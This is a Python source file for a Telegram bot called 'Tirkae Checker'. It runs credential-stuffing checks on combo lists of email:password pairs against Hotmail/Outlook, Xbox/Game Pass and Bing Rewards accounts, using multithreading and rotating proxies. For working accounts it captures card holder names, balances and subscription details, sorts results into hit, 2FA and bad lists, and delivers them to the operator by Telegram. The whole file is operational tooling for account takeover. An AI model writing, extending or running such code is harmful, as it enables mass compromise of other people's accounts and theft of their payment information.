def build_summary_text(s):
    elapsed = time.time() - s.start_time
    mins = int(elapsed // 60)
    secs = int(elapsed % 60)
    if s.mode == 'xbox':
        summary = (
            f"📊 𝗙𝗜𝗡𝗔𝗟 𝗦𝗨𝗠𝗠𝗔𝗥𝗬\n\n"
            f"📦 Total: {s.total}\n"
            f"✅ Checked: {s.checked}\n"
            f"🔥 Premium: {s.hits}\n"
            f"◎ Free: {s.free}\n"
            f"❌ Bad: {s.bad}\n"
            f"🔐 2FA: {s.twofa}\n"
            f"❓ Unknown: {s.unknown}\n"
            f"🔄 Retries: {s.retries}\n"
            f"📈 Success Rate: {s.get_success_rate()}%\n"
            f"⏱ Time: {mins}m {secs}s\n"
            f"⚡ Avg CPM: {s.get_cpm()}"
        )
    else:
        summary = (
            f"📊 𝗙𝗜𝗡𝗔𝗟 𝗦𝗨𝗠𝗠𝗔𝗥𝗬\n\n"
            f"📦 Total: {s.total}\n"
            f"✅ Checked: {s.checked}\n"
            f"🔥 Hits: {s.hits}\n"
            f"❌ Bad: {s.bad}\n"
            f"🔐 2FA: {s.twofa}\n"
            f"❓ Unknown: {s.unknown}\n"
            f"🔄 Retries: {s.retries}\n"
            f"📈 Success Rate: {s.get_success_rate()}%\n"
            f"⏱ Time: {mins}m {secs}s\n"
            f"⚡ Avg CPM: {s.get_cpm()}"
        )
    return summary

def send_result_files(s):
    session_dir = f"results_{s.chat_id}_{s.message_id}"
    os.makedirs(session_dir, exist_ok=True)
    files = []

    # For rewards mode, sort hit_lines by points ascending
    if s.mode == 'rewards' and s.hit_lines:
        sorted_hits = sort_hit_lines_by_points(s.hit_lines)
    else:
        sorted_hits = s.hit_lines

    if s.mode == 'xbox':
        if s.hit_lines:
            path = os.path.join(session_dir, "Premium.txt")
            with open(path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(s.hit_lines))
            files.append(path)
        if s.free_lines:
            path = os.path.join(session_dir, "Free.txt")
            with open(path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(s.free_lines))
            files.append(path)
    else:
        if sorted_hits:
            path = os.path.join(session_dir, "Hits.txt")
            with open(path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(sorted_hits))
            files.append(path)

    if s.bad_lines:
        path = os.path.join(session_dir, "Bad.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(s.bad_lines))
        files.append(path)

    if s.twofa_lines:
        path = os.path.join(session_dir, "2FA.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(s.twofa_lines))
        files.append(path)

    if s.unknown_lines:
        path = os.path.join(session_dir, "Unknown.txt")
        with open(path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(s.unknown_lines))
        files.append(path)

    summary_path = os.path.join(session_dir, "Summary.txt")
    with open(summary_path, 'w', encoding='utf-8') as f:
        f.write(build_summary_text(s))
    files.append(summary_path)

    for fp in files:
        try:
            with open(fp, 'rb') as f:
                bot.send_document(s.chat_id, f, reply_to_message_id=s.message_id)
        except Exception as e:
            print(f"[ERROR] Sending file {fp}: {e}")

    try:
        shutil.rmtree(session_dir, ignore_errors=True)
    except:
        pass

def update_status_message(s, finished=False):
    now = time.time()
    if not finished and (now - s.last_update_time) < 3:
        return
    s.last_update_time = now
    text = build_status_text(s, finished=finished)
    if finished:
        try:
            bot.edit_message_text(text, s.chat_id, s.message_id, parse_mode="HTML")
        except:
            pass
    else:
        kb = InlineKeyboardMarkup()
        kb.row(
            InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{s.chat_id}_{s.message_id}"),
            InlineKeyboardButton("📥 GET HITS", callback_data=f"gethits_{s.chat_id}_{s.message_id}")
        )
        try:
            bot.edit_message_text(text, s.chat_id, s.message_id, parse_mode="HTML", reply_markup=kb)
        except:
            pass

def checker_worker(s):
    # Choose checker based on mode
    if s.mode == 'hotmail':
        from anasChkAccount import anasChkAccount  # assuming it's imported
        checker_func = anasChkAccount
    elif s.mode == 'xbox':
        xb = XboxChecker(debug=False)
        checker_func = xb.check
    else:  # rewards
        rw = RewardsPointsChecker(debug=False)
        checker_func = rw.get_points

    while not s.stop_flag.is_set():
        try:
            combo = s.combo_queue.get_nowait()
        except queue.Empty:
            break

        email_display = combo.split(':')[0] if ':' in combo else combo
        with s.lock:
            s.current_checking = email_display

        proxy_dict = s.get_proxy_dict()

        try:
            if s.mode == 'hotmail':
                final_status, hit_data_str, retries = checker_func(combo, proxy_dict)
                with s.lock:
                    s.checked += 1
                    s.retries += retries
                    if final_status == "HIT":
                        s.hits += 1
                        if hit_data_str:
                            s.hit_lines.append(hit_data_str)
                        else:
                            s.hit_lines.append(combo)
                    elif final_status == "BAD_CREDENTIALS":
                        s.bad += 1
                        s.bad_lines.append(combo)
                    elif final_status == "2FA_REQUIRED":
                        s.twofa += 1
                        s.twofa_lines.append(combo)
                    else:
                        s.unknown += 1
                        s.unknown_lines.append(f"{combo} | {final_status}")

            elif s.mode == 'xbox':
                result = checker_func(email_display, combo.split(':',1)[1], proxy_dict)
                status = result['status']
                data = result.get('data', {})
                with s.lock:
                    s.checked += 1
                    if status == "PREMIUM":
                        s.hits += 1
                        capture = []
                        capture.append("Type: " + data.get('premium_type', 'UNKNOWN'))
                        if data.get('name'):
                            capture.append("Name: " + data['name'])
                        capture.append("Country: " + data.get('country', 'N/A'))
                        capture.append("Days: " + data.get('days_remaining', '0'))
                        capture.append("AutoRenew: " + data.get('auto_renew', 'NO'))
                        capture.append("Renewal: " + data.get('renewal_date', 'N/A'))
                        if 'card_holder' in data:
                            capture.append("Card: " + data['card_holder'])
                        if 'balance' in data:
                            capture.append("Balance: " + data['balance'])
                        if 'rewards_points' in data:
                            capture.append("Points: " + data['rewards_points'])
                        s.hit_lines.append(combo + " | " + " | ".join(capture))
                    elif status == "FREE":
                        s.free += 1
                        capture = []
                        if data.get('name'):
                            capture.append("Name: " + data['name'])
                        capture.append("Country: " + data.get('country', 'N/A'))
                        if 'rewards_points' in data:
                            capture.append("Points: " + data['rewards_points'])
                        if 'card_holder' in data:
                            capture.append("Card: " + data['card_holder'])
                        s.free_lines.append(combo + " | " + " | ".join(capture))
                    elif status == "BAD":
                        s.bad += 1
                        s.bad_lines.append(combo)
                    elif status == "2FACTOR":
                        s.twofa += 1
                        s.twofa_lines.append(combo + " | 2FA")
                    else:
                        s.unknown += 1
                        s.unknown_lines.append(f"{combo} | {status}")

            else:  # rewards
                status, points, message = checker_func(email_display, combo.split(':',1)[1], proxy_dict)
                with s.lock:
                    s.checked += 1
                    # Follow original API logic: hit if points > 10
                    if status == "SUCCESS" and points is not None and points > 10:
                        s.hits += 1
                        # Format: [points] - email:pass
                        s.hit_lines.append(f"[{points}] - {combo}")
                    elif status in ("BAD", "AUTH_FAIL", "NOT_ENROLLED", "NO_POINTS", "TIMEOUT", "PROXY_ERROR", "ERROR"):
                        s.bad += 1
                        s.bad_lines.append(f"{combo} | {status} | {message}")
                    elif status in ("2FA", "RECOVER", "LOCKED"):
                        s.twofa += 1
                        s.twofa_lines.append(f"{combo} | {status} | {message}")
                    else:
                        s.unknown += 1
                        s.unknown_lines.append(f"{combo} | {status} | {message}")

        except Exception as e:
            print(f"[WORKER ERROR] {e}")
            with s.lock:
                s.unknown += 1
                s.unknown_lines.append(f"{combo} | EXCEPTION")

        # If proxy error, remove proxy
        if proxy_dict and s.use_default_proxies:
            s.report_proxy_failure(proxy_dict)

        update_status_message(s)
        s.combo_queue.task_done()

def run_checker(s):
    print(f"[INFO] Starting {s.mode} checker: {s.total} combos, {s.threads_count} threads")
    threads = []
    actual_workers = min(s.threads_count, s.total)
    if actual_workers == 0:
        actual_workers = 1

    for _ in range(actual_workers):
        t = threading.Thread(target=checker_worker, args=(s,), daemon=True)
        threads.append(t)
        t.start()

    while True:
        alive = any(t.is_alive() for t in threads)
        if not alive:
            break
        if s.stop_flag.is_set():
            while not s.combo_queue.empty():
                try:
                    s.combo_queue.get_nowait()
                    s.combo_queue.task_done()
                except queue.Empty:
                    break
            break
        time.sleep(1)
        update_status_message(s)

    for t in threads:
        t.join(timeout=5)

    stopped = s.stop_flag.is_set()
    update_status_message(s, finished=True)

    summary_text = build_summary_text(s)
    if stopped:
        summary_text = f"🛑 <b>CHECKER STOPPED</b>\n\n" + summary_text
    else:
        summary_text = f"✅ <b>CHECKER COMPLETED</b>\n\n" + summary_text

    try:
        bot.send_message(s.chat_id, summary_text, parse_mode="HTML", reply_to_message_id=s.message_id)
    except Exception as e:
        print(f"[ERROR] Sending summary: {e}")

    send_result_files(s)

    session_key = f"{s.chat_id}_{s.message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]

    print(f"[INFO] Checker done. H:{s.hits} F:{s.free} B:{s.bad} 2FA:{s.twofa} U:{s.unknown}")

# ---------- BOT HANDLERS ----------
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ <b>Access Denied</b>", parse_mode="HTML")
        return

    text = (
        f"🩸 <b>𝗧𝗜𝗥𝗞𝗔𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>Welcome to Tirkae Checker</b>\n\n"
        f"🦋 <i>Multi‑mode account checker</i>\n\n"
        f"┌──────────────────────────┐\n"
        f"│ 💀 <b>𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦</b>                   │\n"
        f"├──────────────────────────┤\n"
        f"│ ✅ Hotmail / Xbox / Rewards   │\n"
        f"│ 💳 Payment Info Extraction   │\n"
        f"│ 🏆 Rewards Points Check      │\n"
        f"│ 🔐 2FA Detection             │\n"
        f"│ ⚡ Multi-Threaded Engine     │\n"
        f"│ 📊 Live Progress Updates     │\n"
        f"│ 🌐 Auto Proxy Scraper        │\n"
        f"└──────────────────────────┘\n\n"
        f"📁 <b>Send me a combo file to start</b>\n"
        f"<i>Supported: .txt files with email:pass</i>\n"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "⛔ <b>Access Denied</b>", parse_mode="HTML")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8', errors='ignore')
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error reading file:</b> <code>{e}</code>", parse_mode="HTML")
        return

    combos = extract_combos(content)

    if not combos:
        bot.reply_to(
            message,
            "❌ <b>No valid combos found!</b>\n\n<i>Make sure file contains email:password format</i>",
            parse_mode="HTML"
        )
        return

    user_states[message.from_user.id] = {
        'combos': combos,
        'original_message_id': message.message_id
    }

    text = (
        f"🩸 <b>𝗖𝗢𝗠𝗕𝗢𝗦 𝗟𝗢𝗔𝗗𝗘𝗗</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📦 <b>Total Combos:</b> <code>{len(combos)}</code>\n\n"
        f"⚡ <b>Now send the number of threads</b>\n"
        f"<i>Choose between 1 to 100</i>\n\n"
        f"<b>Example:</b> <code>10</code>\n"
    )
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.from_user.id in user_states and m.text and m.text.strip().isdigit())
def handle_threads(message):
    if message.from_user.id not in user_states:
        return

    threads_count = int(message.text.strip())
    if threads_count < 1 or threads_count > 100:
        bot.reply_to(
            message,
            "⚠️ <b>Invalid thread count!</b>\n<i>Send a number between 1 and 100</i>",
            parse_mode="HTML"
        )
        return

    user_states[message.from_user.id]['threads'] = threads_count
    user_states[message.from_user.id]['step'] = 'awaiting_proxy'

    bot.send_message(
        message.chat.id,
        "📁 <b>Proxy Option</b>\n\n"
        "Send a proxy file (ip:port or protocol://user:pass@ip:port) OR\n"
        "Type <code>default</code> to use auto-scraped proxies (refreshed every 5 minutes)\n"
        "Type <code>skip</code> to run without proxies",
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.text and m.text.lower() == 'default')
def handle_default_proxy(message):
    if message.from_user.id not in user_states or user_states[message.from_user.id].get('step') != 'awaiting_proxy':
        bot.reply_to(message, "⚠️ Please send a combo file and threads first.")
        return

    user_states[message.from_user.id]['use_default'] = True
    user_states[message.from_user.id]['custom_proxies'] = []
    user_states[message.from_user.id]['step'] = 'awaiting_mode'

    bot.send_message(
        message.chat.id,
        "⚡ <b>Choose mode</b>\n\n"
        "Type <code>hotmail</code> for Hotmail/Outlook checker\n"
        "Type <code>xbox</code> for Xbox/Game Pass checker\n"
        "Type <code>rewards</code> for Bing Rewards points checker",
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.text and m.text.lower() == 'skip')
def handle_skip_proxy(message):
    if message.from_user.id not in user_states or user_states[message.from_user.id].get('step') != 'awaiting_proxy':
        bot.reply_to(message, "⚠️ Please send a combo file and threads first.")
        return

    user_states[message.from_user.id]['use_default'] = False
    user_states[message.from_user.id]['custom_proxies'] = []
    user_states[message.from_user.id]['step'] = 'awaiting_mode'

    bot.send_message(
        message.chat.id,
        "⚡ <b>Choose mode</b>\n\n"
        "Type <code>hotmail</code> for Hotmail/Outlook checker\n"
        "Type <code>xbox</code> for Xbox/Game Pass checker\n"
        "Type <code>rewards</code> for Bing Rewards points checker",
        parse_mode="HTML"
    )

@bot.message_handler(content_types=['document'], func=lambda m: m.from_user.id == ADMIN_ID and m.from_user.id in user_states and user_states[m.from_user.id].get('step') == 'awaiting_proxy')
def handle_proxy_file(message):
    if message.from_user.id not in user_states:
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        content = downloaded.decode('utf-8', errors='ignore')
        proxies = load_proxies_from_text(content)
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error reading proxy file:</b> <code>{e}</code>", parse_mode="HTML")
        return

    if not proxies:
        bot.reply_to(message, "❌ <b>No valid proxies found!</b>\nType <code>default</code> or <code>skip</code>.", parse_mode="HTML")
        return

    user_states[message.from_user.id]['use_default'] = False
    user_states[message.from_user.id]['custom_proxies'] = proxies
    user_states[message.from_user.id]['step'] = 'awaiting_mode'

    bot.send_message(
        message.chat.id,
        f"📦 <b>Loaded {len(proxies)} custom proxies</b>\n\n"
        "⚡ <b>Choose mode</b>\n\n"
        "Type <code>hotmail</code> for Hotmail/Outlook checker\n"
        "Type <code>xbox</code> for Xbox/Game Pass checker\n"
        "Type <code>rewards</code> for Bing Rewards points checker",
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID and m.text and m.text.lower() in ['hotmail', 'xbox', 'rewards'])
def handle_mode(message):
    if message.from_user.id not in user_states or user_states[message.from_user.id].get('step') != 'awaiting_mode':
        bot.reply_to(message, "⚠️ Please complete previous steps first.")
        return

    mode = message.text.lower()
    state = user_states.pop(message.from_user.id)
    combos = state['combos']
    threads = state['threads']
    use_default = state.get('use_default', False)
    custom_proxies = state.get('custom_proxies', [])

    starting_text = (
        f"🩸 <b>𝗧𝗜𝗥𝗞𝗔𝗘 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗦𝗧𝗔𝗥𝗧𝗜𝗡𝗚</b> 🩸\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚡ <b>Mode:</b> <code>{mode.upper()}</code>\n"
        f"📦 <b>Combos:</b> <code>{len(combos)}</code>\n"
        f"🔥 <b>Threads:</b> <code>{threads}</code>\n"
        f"🌐 <b>Proxies:</b> <code>{'Auto' if use_default else 'Custom' if custom_proxies else 'None'}</code>\n\n"
        f"🔄 <i>Please wait...</i>\n"
    )
    sent = bot.reply_to(message, starting_text, parse_mode="HTML")
    status_msg_id = sent.message_id

    s = CheckerSession(
        chat_id=message.chat.id,
        message_id=status_msg_id,
        combos=combos,
        threads_count=threads,
        mode=mode,
        use_default_proxies=use_default,
        custom_proxies=custom_proxies
    )
    session_key = f"{message.chat.id}_{status_msg_id}"
    active_sessions[session_key] = s

    # Trigger proxy refresh if needed
    if use_default and not proxy_manager.proxies:
        threading.Thread(target=proxy_manager.refresh, daemon=True).start()

    initial_text = build_status_text(s)
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{message.chat.id}_{status_msg_id}"),
        InlineKeyboardButton("📥 GET HITS", callback_data=f"gethits_{message.chat.id}_{status_msg_id}")
    )
    try:
        bot.edit_message_text(initial_text, message.chat.id, status_msg_id, parse_mode="HTML", reply_markup=kb)
    except:
        pass

    t = threading.Thread(target=run_checker, args=(s,), daemon=True)
    t.start()

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Access Denied", show_alert=True)
        return
    parts = call.data.split("_")
    if len(parts) >= 3:
        session_key = f"{parts[1]}_{parts[2]}"
        if session_key in active_sessions:
            active_sessions[session_key].stop_flag.set()
            bot.answer_callback_query(call.id, "🛑 Stopping checker...", show_alert=False)
        else:
            bot.answer_callback_query(call.id, "⚠️ Session not found", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "⚠️ Invalid action", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gethits_"))
def handle_gethits(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Access Denied", show_alert=True)
        return
    parts = call.data.split("_")
    if len(parts) >= 3:
        session_key = f"{parts[1]}_{parts[2]}"
        if session_key in active_sessions:
            s = active_sessions[session_key]
            bot.answer_callback_query(call.id, "📥 Sending current results...", show_alert=False)
            with s.lock:
                current_hits = list(s.hit_lines)
                current_free = list(s.free_lines)
                current_twofa = list(s.twofa_lines)
                current_unknown = list(s.unknown_lines)
                current_bad = s.bad
                current_checked = s.checked

            # For rewards mode, sort hits
            if s.mode == 'rewards' and current_hits:
                current_hits = sort_hit_lines_by_points(current_hits)

            temp_dir = f"temp_{session_key}"
            os.makedirs(temp_dir, exist_ok=True)
            files_sent = False

            if current_hits:
                path = os.path.join(temp_dir, "Hits_Current.txt" if s.mode in ('hotmail','rewards') else "Premium_Current.txt")
                with open(path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(current_hits))
                try:
                    with open(path, 'rb') as f:
                        bot.send_document(call.message.chat.id, f, reply_to_message_id=int(parts[2]))
                    files_sent = True
                except:
                    pass

            if s.mode == 'xbox' and current_free:
                path = os.path.join(temp_dir, "Free_Current.txt")
                with open(path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(current_free))
                try:
                    with open(path, 'rb') as f:
                        bot.send_document(call.message.chat.id, f, reply_to_message_id=int(parts[2]))
                    files_sent = True
                except:
                    pass

            if current_twofa:
                path = os.path.join(temp_dir, "2FA_Current.txt")
                with open(path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(current_twofa))
                try:
                    with open(path, 'rb') as f:
                        bot.send_document(call.message.chat.id, f, reply_to_message_id=int(parts[2]))
                    files_sent = True
                except:
                    pass

            if current_unknown:
                path = os.path.join(temp_dir, "Unknown_Current.txt")
                with open(path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(current_unknown))
                try:
                    with open(path, 'rb') as f:
                        bot.send_document(call.message.chat.id, f, reply_to_message_id=int(parts[2]))
                    files_sent = True
                except:
                    pass

            interim_text = (
                f"📊 <b>𝗜𝗡𝗧𝗘𝗥𝗜𝗠 𝗥𝗘𝗣𝗢𝗥𝗧</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Hits: <code>{len(current_hits)}</code>\n"
                f"◎ Free: <code>{len(current_free)}</code>\n"
                f"❌ Bad: <code>{current_bad}</code>\n"
                f"🔐 2FA: <code>{len(current_twofa)}</code>\n"
                f"❓ Unknown: <code>{len(current_unknown)}</code>\n"
                f"📦 Checked: <code>{current_checked}/{s.total}</code>\n"
            )
            try:
                bot.send_message(call.message.chat.id, interim_text, parse_mode="HTML", reply_to_message_id=int(parts[2]))
            except:
                pass

            if not files_sent:
                try:
                    bot.send_message(call.message.chat.id, "📭 <i>No results yet</i>", parse_mode="HTML", reply_to_message_id=int(parts[2]))
                except:
                    pass

            try:
                shutil.rmtree(temp_dir, ignore_errors=True)
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "⚠️ Session not found", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "⚠️ Invalid action", show_alert=True)

@bot.message_handler(func=lambda m: m.from_user.id != ADMIN_ID)
def handle_unauthorized(message):
    bot.reply_to(message, "⛔ <b>Access Denied</b>\n<i>You are not authorized.</i>", parse_mode="HTML")

if __name__ == "__main__":
    print("🩸 TIRKAE Multi-Mode Checker Bot Starting...")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print("⚡ Bot is running...")
    # Start proxy scraper
    threading.Thread(target=proxy_manager.refresh, daemon=True).start()
    bot.infinity_polling(timeout=60, long_polling_timeout=60)
